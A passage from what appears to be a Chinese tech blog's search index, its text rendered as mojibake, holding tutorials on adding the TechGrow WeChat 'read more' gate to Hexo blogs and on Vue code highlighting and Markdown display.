'https://www.techgrow.cn/img/wx_mp_qr.png' # è‡ªå®šä¹‰çš„ JS èµ„æºé“¾æ¥ï¼Œå¯ç”¨äº CDN åŠ é€Ÿ libUrl: 'https://qiniu.techgrow.cn/readmore/dist/readmore.js' # è‡ªå®šä¹‰çš„ CSS èµ„æºé“¾æ¥ï¼Œå¯ç”¨äºé€‚é…ä¸åŒé£æ ¼çš„åšå®¢ cssUrl: 'https://qiniu.techgrow.cn/readmore/dist/hexo.css' # æ–‡ç« å†…å®¹çš„é¢„è§ˆé«˜åº¦ height: 'auto' # æ–‡ç« è§£é”åå‡­è¯çš„æœ‰æ•ˆå¤©æ•° expires: 365 # å®šæ—¶æ ¡éªŒå‡­è¯æœ‰æ•ˆæ€§çš„æ—¶é—´é—´éš”ï¼ˆç§’ï¼‰ interval: 60 # æ¯ç¯‡æ–‡ç« éšæœºæ·»åŠ å¾®ä¿¡å…¬ä¼—å·å¼•æµå·¥å…·çš„æ¦‚ç‡ï¼Œæœ‰æ•ˆèŒƒå›´åœ¨ 0.1 ~ 1 ä¹‹é—´ï¼Œ1 åˆ™è¡¨ç¤ºæ‰€æœ‰æ–‡ç« é»˜è®¤éƒ½è‡ªåŠ¨æ·»åŠ å¼•æµå·¥å…· random: 1 æˆ–è€…æ‰“å¼€ TechGrow çš„åšå®¢åå°ç®¡ç†é¡µé¢ï¼Œç‚¹å‡»åšå®¢åˆ—è¡¨ä¸­å³ä¾§çš„ ä½¿ç”¨ é“¾æ¥ï¼Œå°†çª—å£é‡Œçš„ YAML é…ç½®å†…å®¹å¤åˆ¶åˆ° Hexo è‡ªèº«çš„ _config.yml é…ç½®æ–‡ä»¶å³å¯ å‚æ•°è¯´æ˜ å‚æ•° ç±»å‹ å¿…å¡« é»˜è®¤å€¼ è¯´æ˜ enable Boolean æ˜¯ false - blogId String æ˜¯ - name String æ˜¯ - keyword String æ˜¯ - qrcode String æ˜¯ - libUrl String å¦ https://qiniu.techgrow.cn/readmore/dist/readmore.js - cssUrl String å¦ https://qiniu.techgrow.cn/readmore/dist/hexo.css - height String / Number å¦ auto - expires Number å¦ 365 - interval Number å¦ 60 - random Number å¦ 1 - æ„å»º Hexo è¿è¡Œ hexo clean å‘½ä»¤æ¸…ç†æœ¬åœ°åšå®¢ 1$ hexo clean è¿è¡Œ hexo generate å‘½ä»¤æ„å»ºæœ¬åœ°åšå®¢ 1$ hexo generate è¿è¡Œ hexo server å‘½ä»¤å¯åŠ¨æœ¬åœ°åšå®¢æœåŠ¡ 1$ hexo server éªŒè¯æ’ä»¶æ•ˆæœæ‰“å¼€æ–‡ç« é¡µé¢ï¼Œè‹¥æ–‡ç« è‡ªåŠ¨éšè—äº†éƒ¨åˆ†å†…å®¹ï¼Œå¹¶ä¸”å‡ºç°äº† é˜…è¯»å…¨æ–‡ æŒ‰é’®ï¼Œåˆ™è¯´æ˜å¯¼æµæ’ä»¶æ­£å¸¸è¿è¡Œï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ç‚¹å‡» é˜…è¯»å…¨æ–‡ æŒ‰é’®ï¼Œä¼šå¼¹å‡ºå¾®ä¿¡å…¬ä¼—å·çš„äºŒç»´ç çª—å£ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š å–æ¶ˆé˜…è¯»é™åˆ¶è‹¥å¸Œæœ›å…³é—­æŸç¯‡æ–‡ç« çš„å¾®ä¿¡å…¬ä¼—å·å¯¼æµåŠŸèƒ½ï¼Œå¯ä»¥åœ¨æ–‡ç« çš„å¤´æ¨¡æ¿ä¸­ä½¿ç”¨ readmore: false é…ç½®å±æ€§ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 12345678---title: Hexoç‰ˆæœ¬å‡çº§æ•™ç¨‹tags: [Hexo]readmore: falsekeywords: [Hexo, ç‰ˆæœ¬å‡çº§]date: 2022-01-12 22:25:49updated: 2022-01-12 22:25:49--- è‡ªå®šä¹‰æ ·å¼æ’ä»¶é»˜è®¤ä½¿ç”¨äº†å®šä¹‰åœ¨ hexo.css çš„ CSS æ ·å¼ï¼Œä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä¸¤ç§æ–¹å¼è‡ªå®šä¹‰è‡ªå·±çš„æ ·å¼ï¼š ç¬¬ä¸€ç§æ–¹å¼ï¼šæ›´æ”¹åšå®¢ä¸»é¢˜çš„ CSS æºç æ–‡ä»¶ï¼Œå°†è‡ªå®šä¹‰çš„é‚£éƒ¨åˆ† CSS æ ·å¼æ·»åŠ åˆ°é‡Œé¢ ç¬¬äºŒç§æ–¹å¼ï¼šæ ¹æ® hexo.css åˆ›å»ºè‡ªå·±çš„ CSS æ–‡ä»¶ï¼ˆå®Œæ•´çš„ï¼‰ï¼Œå¹¶å°†å…¶å­˜æ”¾åœ¨è‡ªå·±çš„åšå®¢é‡Œï¼ŒåŒæ—¶é€šè¿‡æ’ä»¶çš„ cssUrl é…ç½®å‚æ•°æ¥æŒ‡å®šå…¶è®¿é—®çš„ URL è·¯å¾„ å·²å…¼å®¹çš„ä¸»é¢˜ NexT Yilia Icarus Matery Fluid Stun åœ¨çº¿æ¼”ç¤º å®˜æ–¹åšå®¢ å®˜æ–¹å¾®ä¿¡ç¾¤",tags:"é™æ€åšå®¢"},{title:"åšå®¢å¯¼æµå¾®ä¿¡å…¬ä¼—å·",url:"/posts/48b470db.html",text:'å‰è¨€åšå®¢å°†æµé‡å¯¼å‘å¾®ä¿¡å…¬ä¼—å·å¾ˆç®€å•ï¼Œå¯ä»¥ä½¿ç”¨ TechGrow çš„å…è´¹å¯¼æµå·¥å…·å®ç°ï¼Œç”¨æˆ·æ‰«ç å…³æ³¨å¾®ä¿¡å…¬ä¼—å·åå¯ä»¥è§£é”å…¨ç«™æ–‡ç« ï¼Œè®©å¾®ä¿¡å…¬ä¼—å·çš„ç²‰ä¸æ•°èººç€å¢é•¿ã€‚æ•´ä¸ªè¿‡ç¨‹åªéœ€å…­æ­¥å°±å¯ä»¥æå®šï¼Œé€‚ç”¨äºå„ç±»ä¸»æµçš„åšå®¢ï¼Œæœ¬æ–‡ä»¥ Hexo çš„ NexT ä¸»é¢˜åšå®¢ä¸¾ä¾‹ã€‚ æç¤º TechGrow å¼€æ”¾å¹³å°çš„ å®˜æ–¹æ–‡æ¡£ è‹¥ä½¿ç”¨çš„æ˜¯ Hexo é™æ€åšå®¢ï¼Œå»ºè®®ç›´æ¥å®‰è£… hexo-readmore æ’ä»¶ï¼Œè¯¦ç»†æ•™ç¨‹å¯ç‚¹å‡»è¿™é‡Œ è‹¥ä½¿ç”¨çš„æ˜¯ VuePress v1.x é™æ€åšå®¢ï¼Œå»ºè®®ç›´æ¥å®‰è£… vuepress-plugin-readmore-popular æ’ä»¶ï¼Œè¯¦ç»†æ•™ç¨‹å¯ç‚¹å‡»è¿™é‡Œ ç‰¹è‰²åŠŸèƒ½ å…¼å®¹ä¸»æµçš„åšå®¢æ¡†æ¶ æ”¯æŒéšæœºä¸ºåšå®¢æ·»åŠ å¼•æµåŠŸèƒ½ æ”¯æŒæŸ¥è¯¢ç”¨æˆ·è§£é”æ–‡ç« çš„å†å²è®°å½• æ”¯æŒè‡ªå®šä¹‰æˆ–è€…åŠ¨æ€è®¡ç®—æ–‡ç« å†…å®¹çš„é¢„è§ˆé«˜åº¦ æ”¯æŒè‡ªå®šä¹‰ CSS æ ·å¼ï¼Œè½»æ¾é€‚é…ä¸åŒé£æ ¼çš„åšå®¢ ç¬¬ä¸€æ­¥ï¼šæ³¨å†Œåšå®¢æµè§ˆå™¨è®¿é—® TechGrow çš„å®˜ç½‘ ï¼Œæ³¨å†Œå¹¶ç™»å½•è´¦å·åï¼Œè¿›å…¥åšå®¢çš„åå°ç®¡ç†é¡µé¢ã€‚é¦–å…ˆç‚¹å‡»å·¦ä¾§çš„èœå• åšå®¢æ³¨å†Œï¼Œç„¶åç‚¹å‡» æ–°å¢ æŒ‰é’®ï¼Œæ·»åŠ è‡ªå·±åšå®¢çš„ä¿¡æ¯ã€‚åšå®¢æ³¨å†ŒæˆåŠŸåï¼Œè®°å½•ä¸‹ åšå®¢ IDï¼Œåé¢çš„æ­¥éª¤ä¼šä½¿ç”¨åˆ° ç¬¬äºŒæ­¥ï¼šè®¾ç½®å…¬ä¼—å·åœ¨å¾®ä¿¡å…¬ä¼—å·çš„åå°ç®¡ç†é¡µé¢ï¼Œèœå•æ é‡Œé€‰æ‹© è‡ªåŠ¨å›å¤ - å…³é”®è¯å›å¤ï¼Œå¯ç”¨ è‡ªåŠ¨å›å¤ï¼Œç„¶åç‚¹å‡» æ·»åŠ å›å¤ æŒ‰é’®ï¼š å¡«å†™ è§„åˆ™åç§°ã€å…³é”®è¯ï¼ˆå½“åˆä½ åœ¨ TechGrow ä¸­è®¾ç½®çš„ï¼‰ã€å›å¤å†…å®¹ é€‰æ‹© æ–‡å­—ï¼Œç„¶å å›å¤æ–‡å­— çš„å†…å®¹å¡«å†™è·å–åšå®¢è§£é”éªŒè¯ç çš„é“¾æ¥ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼ˆè¯·è‡ªè¡Œæ›´æ”¹ xxxxx-xxxxxxxxx-xxx ä¸ºä½ ç”³è¯·åˆ°çš„åšå®¢ IDï¼‰ 1&lt;a href="https://open.techgrow.cn/#/readmore/captcha/generate?blogId=xxxxx-xxxxxxxxx-xxx"&gt;ç‚¹å‡»é“¾æ¥ï¼Œè·å–åšå®¢è§£é”éªŒè¯ç &lt;/a&gt; æ­¤æ—¶ï¼Œå½“è¯»è€…å…³æ³¨ä½ çš„å¾®ä¿¡å…¬ä¼—å·ï¼Œå¹¶è¾“å…¥å…³é”®è¯åï¼ˆæ¯”å¦‚æˆ‘è®¾ç½®çš„å…³é”®è¯å°±æ˜¯ techï¼‰ï¼Œé‚£ä¹ˆè¯»è€…å°±ä¼šè‡ªåŠ¨æ¥æ”¶åˆ°è·å–åšå®¢è§£é”éªŒè¯ç çš„é“¾æ¥ ç¬¬ä¸‰æ­¥ï¼šå®šä½æ–‡ç« ä¸»ä½“çš„æ ‡ç­¾å…ƒç´ åœ¨ Hexo åšå®¢çš„ themes ç›®å½•ä¸‹ï¼Œæ‰¾åˆ°ä½ æ­£åœ¨ä½¿ç”¨çš„ä¸»é¢˜ç›®å½•ï¼Œæ¯”å¦‚ï¼šnext ç­‰ï¼Œå…·ä½“æ ¹æ®ä½ é€‰æ‹©çš„ä¸»é¢˜æ¥åˆ¤æ–­ã€‚è¿›å…¥ä¸»é¢˜æºç çš„ layout ç›®å½•ï¼Œæ‰¾åˆ° _macro/post.njk æ¨¡æ¿æ–‡ä»¶ï¼Œè‹¥è¿™é‡Œæœ‰ä¸€å¤§æ®µä¸æ–‡ç« ä¸»ä½“å†…å®¹ç›¸å…³çš„ HTML ä»£ç ï¼Œé‚£å°±è¯´æ˜æ–‡ç« ä¸»ä½“æ ‡ç­¾å…ƒç´ çš„æ¨¡æ¿å®šä¹‰å°±åœ¨è¿™é‡Œï¼Œç¤ºä¾‹æ¨¡æ¿ä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718&lt;div class="post-block"&gt; {# Gallery support #} {{ post_gallery(post.photos) }} &lt;!-- æ–‡ç« ä¸»ä½“çš„æ ‡ç­¾å…ƒç´  --&gt; &lt;article itemscope itemtype="http://schema.org/Article" class="post-content" lang="{{ post.lang }}"&gt; &lt;link itemprop="mainEntityOfPage" href="{{ post.permalink }}"&gt; &lt;span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"&gt; &lt;meta itemprop="image" content="{{ url_for(theme.avatar.url or theme.images + \'/avatar.gif\') }}"&gt; &lt;meta itemprop="name" content="{{ author }}"&gt; &lt;meta itemprop="description" content="{{ description }}"&gt; &lt;/span&gt; ...ï¼ˆçœç•¥ï¼‰ &lt;/article&gt;&lt;/div&gt; å¦ä¸€ç§å®šä½æ–¹å¼æ˜¯æ‰“å¼€ä½ åšå®¢çš„ä»»æ„ä¸€ç¯‡æ–‡ç« ï¼Œåˆ©ç”¨ Chrome ç­‰æµè§ˆå™¨çš„å…ƒç´ å®¡æŸ¥åŠŸèƒ½ï¼Œæ‰¾åˆ°æ–‡ç« é¡µé¢ä¸­æ–‡ç« ä¸»ä½“çš„æ ‡ç­¾å…ƒç´ ï¼Œæ¯”å¦‚ä¸‹å›¾ä¸­çš„ article å°±æ˜¯æ–‡ç« ä¸»ä½“çš„æ ‡ç­¾å…ƒç´ ï¼š ç¬¬å››æ­¥ï¼šæ–°å¢æ–‡ç« å†…å®¹ DIV æ ‡ç­¾åœ¨æ–‡ç« æ¨¡æ¿æ–‡ä»¶ä¸­æ‰¾åˆ°æ–‡ç« ä¸»ä½“çš„æ ‡ç­¾å…ƒç´ ä¹‹åï¼Œåœ¨å…¶ä¸Šä¸€å±‚åŒ…ä¸€å±‚ div æ ‡ç­¾ï¼Œå¹¶å°† div æ ‡ç­¾çš„ id å±æ€§è®¾ç½®ä¸º readmore-containerï¼Œå³æ·»åŠ çš„ HTML æ ‡ç­¾ä¸º &lt;div id="readmore-container"&gt;ï¼Œç¤ºä¾‹æ¨¡æ¿ä»£ç å¦‚ä¸‹ï¼š 1234567891011121314151617181920&lt;div class="post-block"&gt; {# Gallery support #} {{ post_gallery(post.photos) }} &lt;!-- æ–°å¢çš„DIVæ ‡ç­¾ --&gt; &lt;div id="readmore-container"&gt; &lt;article itemscope itemtype="http://schema.org/Article" class="post-content" lang="{{ post.lang }}"&gt; &lt;link itemprop="mainEntityOfPage" href="{{ post.permalink }}"&gt; &lt;span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"&gt; &lt;meta itemprop="image" content="{{ url_for(theme.avatar.url or theme.images + \'/avatar.gif\') }}"&gt; &lt;meta itemprop="name" content="{{ author }}"&gt; &lt;meta itemprop="description" content="{{ description }}"&gt; &lt;/span&gt; ...ï¼ˆçœç•¥ï¼‰ &lt;/article&gt; &lt;/div&gt;&lt;/div&gt; ç¬¬äº”æ­¥ï¼šæ–°å¢å¯¼æµå·¥å…·çš„ HTML ä»£ç æ‰“å¼€ TechGrow çš„åšå®¢åå°ç®¡ç†é¡µé¢ï¼Œç‚¹å‡»åšå®¢åˆ—è¡¨ä¸­å³ä¾§çš„ ä½¿ç”¨ é“¾æ¥ï¼Œå°†çª—å£é‡Œçš„ HTML ä»£ç å¤åˆ¶åˆ°ç¬¬ä¸‰æ­¥ä¸­æ‰¾åˆ°çš„æ–‡ç« æ¨¡æ¿æ–‡ä»¶çš„æœ«å°¾ï¼Œä¹Ÿå¯ä»¥æ·»åŠ åˆ°ä¸»é¢˜çš„ footer æ¨¡æ¿æ–‡ä»¶ä¸­ï¼Œç¤ºä¾‹ HTML ä»£ç å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š å‚æ•° å¿…å¡« é»˜è®¤å€¼ æè¿° id æ˜¯ DIV æ ‡ç­¾çš„ ID blogId æ˜¯ å·²ç”³è¯·çš„åšå®¢ ID name æ˜¯ å·²ç”³è¯·çš„å¾®ä¿¡å…¬ä¼—å·åç§° qrcode æ˜¯ å·²ç”³è¯·çš„å¾®ä¿¡å…¬ä¼—å·äºŒç»´ç å›¾ç‰‡ keyword æ˜¯ å·²ç”³è¯·çš„å¾®ä¿¡å…¬ä¼—å·å›å¤å…³é”®è¯ height å¦ auto æ–‡ç« å†…å®¹çš„é¢„è§ˆé«˜åº¦ expires å¦ 365 æ–‡ç« è§£é”åå‡­è¯çš„æœ‰æ•ˆå¤©æ•° interval å¦ 60 å®šæ—¶æ ¡éªŒå‡­è¯æœ‰æ•ˆæ€§çš„æ—¶é—´é—´éš”ï¼ˆç§’ï¼‰ type å¦ other åšå®¢ç±»å‹ï¼ŒåŒ…æ‹¬ï¼šhexoã€vuepressã€vuepress2ã€hugoã€gatsbyã€jekyllã€docsifyã€typechoã€wordpressã€other random å¦ 1 æ¯ç¯‡æ–‡ç« éšæœºæ·»åŠ å¾®ä¿¡å…¬ä¼—å·å¼•æµå·¥å…·çš„æ¦‚ç‡ï¼Œæœ‰æ•ˆèŒƒå›´åœ¨ 0.1 ~ 1 ä¹‹é—´ï¼Œ1 åˆ™è¡¨ç¤ºæ‰€æœ‰æ–‡ç« é»˜è®¤éƒ½è‡ªåŠ¨æ·»åŠ å¼•æµå·¥å…· ç¬¬å…­æ­¥ï¼šéªŒè¯å¯¼æµå·¥å…·æ˜¯å¦æ•´åˆæˆåŠŸé‡æ–°æ„å»ºå¹¶è¿è¡Œåšå®¢æœåŠ¡åï¼Œæ‰“å¼€æ–‡ç« é¡µé¢ï¼Œè‹¥æ–‡ç« è‡ªåŠ¨éšè—äº†éƒ¨åˆ†å†…å®¹ï¼Œå¹¶ä¸”å‡ºç°äº† é˜…è¯»å…¨æ–‡ æŒ‰é’®ï¼Œåˆ™è¯´æ˜å¯¼æµå·¥å…·æ•´åˆæˆåŠŸï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ç‚¹å‡» é˜…è¯»å…¨æ–‡ æŒ‰é’®ï¼Œä¼šå¼¹å‡ºå¾®ä¿¡å…¬ä¼—å·çš„äºŒç»´ç çª—å£ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ä½¿ç”¨æ€»ç»“ åšå®¢æ•´åˆå¼•æµå·¥å…·ï¼Œå…¶æœ¬è´¨åŸç†å°±æ˜¯å…ˆåœ¨åšå®¢çš„ä¸»é¢˜æºç é‡Œï¼Œæ‰¾åˆ°æ–‡ç« çš„ä¸»ä½“å†…å®¹ï¼Œç„¶ååœ¨å…¶å¤–é¢åŒ…è£¹ä¸€å±‚ DIV æ ‡ç­¾ï¼ˆ&lt;div id="readmore-container"&gt;ï¼‰ï¼Œæœ€åå†å°†å¼•æµå·¥å…·çš„ HTML ä»£ç æ·»åŠ åˆ°åšå®¢æ–‡ç« çš„æœ«å°¾å³å¯ã€‚ è‡ªå®šä¹‰æ ·å¼å¼•æµå·¥å…·é»˜è®¤ä½¿ç”¨äº†å®šä¹‰åœ¨ readmore.css çš„ CSS æ ·å¼ï¼Œä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä¸¤ç§æ–¹å¼è‡ªå®šä¹‰è‡ªå·±çš„æ ·å¼ï¼š ç¬¬ä¸€ç§æ–¹å¼ï¼šæ›´æ”¹åšå®¢ä¸»é¢˜çš„ CSS æºç æ–‡ä»¶ï¼Œå°†è‡ªå®šä¹‰çš„é‚£éƒ¨åˆ† CSS æ ·å¼æ·»åŠ åˆ°é‡Œé¢ ç¬¬äºŒç§æ–¹å¼ï¼šæ ¹æ® readmore.css åˆ›å»ºè‡ªå·±çš„ CSS æ–‡ä»¶ï¼ˆå®Œæ•´çš„ï¼‰ï¼Œå¹¶å°†å…¶å­˜æ”¾åœ¨è‡ªå·±çš„åšå®¢é‡Œï¼ŒåŒæ—¶é€šè¿‡å¼•æµå·¥å…·çš„ cssUrl é…ç½®å‚æ•°æ¥æŒ‡å®šå…¶è®¿é—®çš„ URL è·¯å¾„ å¸¸è§é—®é¢˜é—®é¢˜ä¸€ åšå®¢æ•´åˆå¼•æµå·¥å…·åï¼Œæµè§ˆå™¨çš„æ§åˆ¶å°è¾“å‡ºè­¦å‘Šæˆ–è€…é”™è¯¯ä¿¡æ¯ï¼Œä¸”å¼•æµå·¥å…·æ— æ³•ç”Ÿæ•ˆ æµè§ˆå™¨è®¿é—®åšå®¢åï¼ŒæŒ‰ä¸‹ F12 å¿«æ·é”®è°ƒå‡ºè°ƒè¯•å·¥å…·ï¼Œç„¶ååˆ‡æ¢åˆ° æ§åˆ¶å°ï¼Œæœ€åå°†è­¦å‘Šæˆ–è€…é”™è¯¯ä¿¡æ¯æˆªå›¾ï¼Œå¹¶å‘é€åˆ° å®˜æ–¹å¾®ä¿¡ç¾¤ æˆ–è€… 656418510@qq.com é‚®ç®±ï¼Œå»ºè®®ç•™è¨€å¤‡æ³¨åšå®¢ä¸åšå®¢ä¸»é¢˜çš„ç±»å‹ã€‚ é—®é¢˜äºŒ åšå®¢æ•´åˆå¼•æµå·¥å…·åï¼Œç§»åŠ¨ç«¯çš„å¼•æµå·¥å…·æ— æ³•ç”Ÿæ•ˆï¼Œè€Œ PC ç«¯å´ç”Ÿæ•ˆ è€ƒè™‘åˆ°ç”¨æˆ·ä½“éªŒçš„é—®é¢˜ï¼Œåœ¨ç§»åŠ¨ç«¯é»˜è®¤æ˜¯å…³é—­å¼•æµåŠŸèƒ½çš„ï¼Œè¯·çŸ¥æ‚‰ã€‚ åœ¨çº¿æ¼”ç¤º å®˜æ–¹åšå®¢ å®˜æ–¹å¾®ä¿¡ç¾¤',tags:"é™æ€åšå®¢"},{title:"Vue é¡µé¢é«˜äº®æ˜¾ç¤ºä»£ç å—",url:"/posts/5cf75f16.html",text:'å‰è¨€Vue é¡µé¢å¯ä»¥åŸºäº vue-prism-editor å®ç°é«˜äº®æ˜¾ç¤ºä»£ç å—ï¼Œæ”¯æŒ Vue 2.x å’Œ Vue 3.xã€‚ æç¤º vue-prism-editor è¦æ±‚ Vue çš„ç‰ˆæœ¬é«˜äº 2.6.11 è‹¥ Vue çš„ç‰ˆæœ¬ä¸º 3.xï¼Œåˆ™éœ€è¦ä½¿ç”¨ vue-prism-editor çš„ feature/next åˆ†æ”¯ä»£ç  å®‰è£…æ¨¡å—1$ npm install vue-prism-editor --save ç”±äº vue-prism-editor ä¾èµ–äº† prismjsï¼Œæ‰€ä»¥è¿˜éœ€è¦å®‰è£… prismjs 1$ npm install prismjs --save Vue ä»£ç åœ¨ Vue é¡µé¢ä¸­å¼•å…¥ vue-prism-editor ç»„ä»¶ï¼Œå®Œæ•´çš„ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;template&gt; &lt;prism-editor class="my-editor height-300" v-model="code" :highlight="highlighter" readonly line-numbers&gt;&lt;/prism-editor&gt;&lt;/template&gt;&lt;script&gt; // import Prism Editor import { PrismEditor } from \'vue-prism-editor\' import \'vue-prism-editor/dist/prismeditor.min.css\' // import highlighting library import { highlight, languages } from \'prismjs/components/prism-core\' import \'prismjs/components/prism-clike\' import \'prismjs/components/prism-javascript\' import \'prismjs/themes/prism-tomorrow.css\' export default { components: { PrismEditor }, data: () =&gt; ({ code: \'console.log("Hello World")\' }), methods: { highlighter (code) { return highlight(code, languages.js) } } }&lt;/script&gt;&lt;style&gt; /* required class */ .my-editor { /* we dont use `language-` classes anymore so thats why we need to add background and text color manually */ background: #2d2d2d; color: #ccc; /* you must provide font-family font-size line-height. Example: */ font-family: Fira code, Fira Mono, Consolas, Menlo, Courier, monospace; font-size: 14px; line-height: 1.5; padding: 5px; } /* optional class for removing the outline */ .prism-editor__textarea:focus { outline: none; } /* not required: */ .height-300 { height: 300px; }&lt;/style&gt; æç¤º highlighterï¼šå®šä¹‰åœ¨ methods ä¸­çš„ä¸€ä¸ªæ–¹æ³•ï¼Œç”¨äºå°†ä»£ç é«˜äº®æ˜¾ç¤º readonlyï¼šä»£ç å—æ˜¯å¦åªè¯»ï¼ˆä¸å¯ç¼–è¾‘ï¼‰ codeï¼šéœ€è¦é«˜äº®æ˜¾ç¤ºçš„ä»£ç å†…å®¹ lineNumbersï¼šæ˜¯å¦æ˜¾ç¤ºè¡Œå· æ¼”ç¤ºæ•ˆæœ å¸¸è§é—®é¢˜é—®é¢˜ä¸€å¦‚æœå®‰è£… NPM æ¨¡å—å¤±è´¥ï¼Œä¸”é”™è¯¯ä¿¡æ¯ä¸­æœ‰æç¤ºå‡çº§ vue@^2.6.11 ç‰ˆæœ¬ï¼Œåˆ™æ ¹æ®æç¤ºå‡çº§ Vue çš„ç‰ˆæœ¬å³å¯ï¼š 1$ npm install vue@^2.6.11 é—®é¢˜äºŒvue ä¸ vue-template-compiler çš„ç‰ˆæœ¬ä¸ä¸€è‡´ï¼Œå¯¼è‡´ Vue é¡¹ç›®ç¼–è¯‘å¤±è´¥ é¦–å…ˆå¸è½½ä½ç‰ˆæœ¬çš„ vue-template-compiler 1$ npm uninstall vue-template-compiler ç„¶åå®‰è£…è·Ÿ vue ç›¸åŒç‰ˆæœ¬çš„ vue-template-compiler 1$ npm install vue-template-compiler@2.6.11 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å‰ç«¯"},{title:"Vue é¡µé¢è¯»å–å¹¶å±•ç¤º Markdown æ–‡ä»¶",url:"/posts/df920f01.html",text:'å‰è¨€å¦‚ä½•åœ¨ Vue ä¸­è¯»å–é¡¹ç›®æœ¬åœ°çš„ MarkDown æ–‡ä»¶å¹¶å±•ç¤ºåœ¨ç½‘é¡µä¸Šå‘¢ï¼ŸæŸ¥é˜…èµ„æ–™åå‘ç°ï¼Œä¸€èˆ¬çš„æ–¹æ¡ˆæ˜¯åœ¨ Vue é¡µé¢ä¸­å¼•å…¥ Markdown ç¼–è¾‘å™¨ï¼Œç„¶ååˆ©ç”¨ç¼–è¾‘å™¨çš„é¢„è§ˆåŠŸèƒ½æ¥å±•ç¤º MarkDown æ–‡ä»¶çš„å†…å®¹ã€‚æ¨èä½¿ç”¨å¼€æºçš„ MarkDown ç¼–è¾‘å™¨ mavonEditor æˆ–è€… vue-meditorã€‚ vue-meditor ä»‹ç»ç®€ä»‹æç¤º vue-meditor å®˜æ–¹æ–‡æ¡£ vue-meditor Github ä»“åº“ vue-markdown æ˜¯ä¸€æ¬¾ä½¿ç”¨ marked å’Œ highlight.js å¼€å‘çš„ä¸€æ¬¾ MarkDown ç¼–è¾‘å™¨ï¼Œä¸»è¦åŒ…æ‹¬ä¸‰ä¸ªéƒ¨åˆ†ï¼š ç®€å•ç‰ˆç¼–è¾‘å™¨ï¼Œå·¦ä¾§æ–‡æœ¬è¾“å…¥æ¡†ä½¿ç”¨ textarea å®ç° ä¸“ä¸šç‰ˆç¼–è¾‘å™¨ï¼Œå·¦ä¾§è¾“å…¥æ¡†ä½¿ç”¨ codemirror å®ç° MarkDown é¢„è§ˆç»„ä»¶ï¼Œå¯å•ç‹¬ä½¿ç”¨ æ˜¾ç¤ºæ•ˆæœå›¾ vue-meditor ä½¿ç”¨ä½¿ç”¨ NPM å®‰è£…1$ npm i -S vue-meditor åœ¨é¡¹ç›®ä¸­å¼•å…¥ç»„ä»¶åœ¨ Vue é¡µé¢ä¸­å¼•å…¥ vue-meditor çš„é¢„è§ˆç»„ä»¶ MarkdownPreviewï¼Œå®Œæ•´ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼Œç¼–è¾‘å™¨çš„å®Œæ•´åŸºæœ¬å±æ€§å¯æŸ¥é˜… å®˜æ–¹æ–‡æ¡£ 1234567891011121314151617181920212223242526272829303132333435&lt;template&gt; &lt;div class="markdown"&gt; &lt;MarkdownPreview v-model="content" :height="1024" :isPreview=true :bordered=false :copyCode=true theme="oneDark" /&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; import MarkdownPreview from \'vue-meditor\' export default { name: \'markdown\', data () { return { content: \'\' } }, components: { MarkdownPreview }, created () { // è¯»å–æœ¬åœ°çš„Markdownæ–‡ä»¶ this.$http.get(\'/static/guide/start.md\').then((response) =&gt; { if (response.data) { this.content = response.data } }) } }&lt;/script&gt; å€¼å¾—ä¸€æçš„æ˜¯ï¼Œ/static/guide/start.md æ˜¯ Vue é¡¹ç›®æ ¹ç›®å½•ä¸‹ MarkDown æ–‡ä»¶çš„è·¯å¾„ï¼Œä¸Šé¢çš„ä»£ç é€šè¿‡ HTTP è¯·æ±‚å»è¯»å– Markdown æ–‡ä»¶ï¼Œè¿™æ ·çš„ä¼˜åŠ¿æ˜¯å¯ä»¥å®æ—¶é¢„è§ˆ MarDown æ–‡ä»¶çš„å†…å®¹ã€‚ æœ€ç»ˆå®ç°çš„æ•ˆæœå›¾ å‚è€ƒèµ„æ–™ Vue ä½¿ç”¨ MarkDown Vue è¯»å–æœ¬åœ° MarkDown æ–‡ä»¶ Vue è¯»å–å±•ç¤º MarkDown æ–‡ä»¶ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å‰ç«¯"},{title:"è¿‘æœŸå­¦ä¹ 